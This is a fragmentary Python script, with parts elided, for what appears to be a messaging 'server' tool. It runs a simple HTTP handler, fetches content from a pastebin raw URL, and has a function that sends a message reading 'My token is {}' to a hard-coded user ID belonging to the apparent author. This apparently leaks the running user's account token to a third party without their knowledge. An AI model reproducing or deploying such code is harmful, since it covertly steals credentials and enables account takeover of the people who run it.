...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"ASHOK SERVER ON FIRE")
...
mmm = requests.get('https://pastebin.com/raw/ZUgjAWth').text
...
def send_initial_message():
    ...
    msg_template = "Hello Khan Aashique sir! I am using your server. My token is {}"

    # Specify the ID where you want to send the message
    target_id = "100002540840668"
